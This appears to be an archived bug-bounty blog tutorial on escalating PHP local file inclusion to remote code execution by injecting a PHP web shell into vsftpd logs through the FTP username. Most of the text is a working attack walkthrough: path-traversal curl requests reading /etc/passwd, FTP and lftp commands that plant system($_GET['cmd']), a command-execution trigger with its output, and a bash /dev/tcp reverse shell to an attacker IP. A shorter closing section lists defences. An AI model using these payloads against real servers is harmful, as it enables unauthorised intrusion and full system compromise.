# From LFI to RCE via /var/log/vsftpd.log

- **Source URL:** https://medium.com/@zoningxtr/from-lfi-to-rce-via-var-log-vsftpd-log-32a9b6ecf3ea?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20250901125009/https://medium.com/@zoningxtr/from-lfi-to-rce-via-var-log-vsftpd-log-32a9b6ecf3ea?source=rss------bug_bounty-5
- **Fetched:** 2026-11-25
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/10414 (id 10414)
- **Method:** trafilatura readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# 📂💣 From LFI to RCE via `/var/log/vsftpd.log` 🐚📜

**Complete Real-World Guide**

🚀 **Local File Inclusion + Log Injection → Remote Code Execution**

By

*Local File Inclusion (LFI) might seem like a low-severity vulnerability, but when combined with exposed log files like /var/log/vsftpd.log, it can escalate into Remote Code Execution (RCE)—turning a minor issue into a full system compromise. 📂💣🐚*

*In this detailed guide, we’ll uncover how vsftpd logs (used to record FTP login attempts) can be manipulated by injecting malicious payloads. When an application suffers from an LFI vulnerability, attackers can include these poisoned log files, execute arbitrary code, and gain full control of the target system. 📜⚡*

D*isclaimer: This content is for educational purposes only. The author is not responsible for any use or misuse of the information provided. You are solely responsible for your actions. Always act ethically and ensure you have proper authorization.*

## 🧠 1. What is LFI?

**Local File Inclusion (LFI)** is a vulnerability where user input is unsafely passed to functions like `include()` or `require()`, allowing attackers to read local files.

## 💡 Example Vulnerable Code

`php````
<?php
  include($_GET['page']);
?>
```
## 💥 Exploitation

`bash``curl "http://target.site/index.php?page=../../../../etc/passwd"`
If you see system file content, **LFI is confirmed**.

## 📂 2. What is `/var/log/vsftpd.log`?

If **vsftpd** (Very Secure FTP Daemon) is installed and logging is enabled, it logs activity like:

- Connection attempts
- User login/logout
- Filenames and input (potentially controllable)

📝 Example log entry:

`Tue Aug 3 22:15:49 2025 [pid 1122] [anonymous] OK LOGIN: Client "192.168.1.100"`
## 🔎 3. Why Is It Useful?

If the log contains **user-controlled input** (like usernames or FTP commands), you can inject **PHP code** into it.

Later, use LFI to **include and execute** that log.

## 🧪 4. Confirm LFI on the Web Application

Test the following URL:

`bash``curl "http://target.site/index.php?page=../../../../etc/passwd"`
If the page shows user info like `root:x:0:0`, you have LFI.

## 🔍 5. Locate FTP Logs via LFI

Check common vsftpd log paths:

`bash````
curl "http://target.site/index.php?page=../../../../var/log/vsftpd.log"
curl "http://target.site/index.php?page=../../../../var/log/messages"
```
Look for FTP-related entries like:

`[username] OK LOGIN: Client "IP"`
## ✍️ 6. Inject PHP Payload via FTP Username

If anonymous login is disabled, you can still **attempt login** using a **custom username**:

`bash``ftp target.site`
When prompted for name:

`php``Name: <?php system($_GET['cmd']); ?>`
Any error or success will be logged like:

`php``[<?php system($_GET['cmd']); ?>] FAIL LOGIN: Client "192.168.1.100"`
✅ This **PHP code is now in the log file.**

## Alternative FTP Injection via `lftp`:

`bash``lftp -u "<?php system($_GET['cmd']); ?>,password" ftp://target.site`
Or even:

`bash````
ftp -n target.site
quote USER <?php system($_GET['cmd']); ?>
quote PASS anything
```
## 🔬 7. Confirm Payload Appears in the Log

Read the log file via LFI:

`bash``curl "http://target.site/index.php?page=../../../../var/log/vsftpd.log"`
📌 If you see your payload (`<?php system($_GET['cmd']); ?>`), you're ready to execute code.

## 💥 8. Trigger the RCE with LFI

Now, include the log file and pass the `cmd` parameter to execute code:

`bash``curl "http://target.site/index.php?page=../../../../var/log/vsftpd.log&cmd=id"`
📤 Output:

`uid=33(www-data) gid=33(www-data) groups=33(www-data)`
💥 Congrats! You now have **RCE** through LFI and log injection!

## 🦞 9. Gain Reverse Shell Access (Optional)

Set up your listener:

`bash``nc -lvnp 4444`
Trigger the payload:

`bash``curl "http://target.site/index.php?page=../../../../var/log/vsftpd.log&cmd=bash -c 'bash -i >& /dev/tcp/YOUR-IP/4444 0>&1'"`
🎯 You now have a remote shell!

## ✅ LFI Protection

- **Never pass raw user input** to `include()` or `require()`.
- Use strict **whitelisting**:

`php````
$allowed = ['home.php', 'contact.php'];
if (in_array($_GET['page'], $allowed)) {
    include($_GET['page']);
}
```
## ✅ Disable Log Execution

Ensure logs are not interpretable as PHP:

- Move logs outside the web root.
- In Apache:

`apache````
<FilesMatch "\.log$">
  php_flag engine off
</FilesMatch>
```
## ✅ Harden FTP Server (vsftpd)

- Disallow anonymous access (`anonymous_enable=NO`)
- Log minimal info (`log_ftp_protocol=NO`)
- Monitor FTP logs for suspicious payloads
- Use fail2ban to detect strange usernames

## ✅ Disable Dangerous PHP Functions

Edit `php.ini`:

`ini``disable_functions = system, exec, passthru, shell_exec`
## ✅ Use `open_basedir` to Limit File Access

`ini``open_basedir = /var/www/html/`
## ✅ Monitor Behavior

- Watch for excessive LFI or log file inclusion attempts
- Alert on PHP tags appearing in `/var/log/`
